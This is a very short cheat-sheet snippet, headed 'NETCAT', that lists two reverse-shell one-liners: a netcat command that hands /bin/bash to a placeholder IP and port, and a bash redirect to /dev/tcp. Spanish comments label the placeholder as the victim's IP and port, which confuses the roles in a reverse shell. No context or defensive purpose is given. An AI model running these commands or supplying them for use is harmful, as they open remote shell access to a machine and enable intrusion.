
-NETCAT
nc -e /bin/bash XXX.XXX.XXX.XXX XXX (ip y puerto de la victima)

bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/XXX 0>&1 (ip y puerto de la victima)
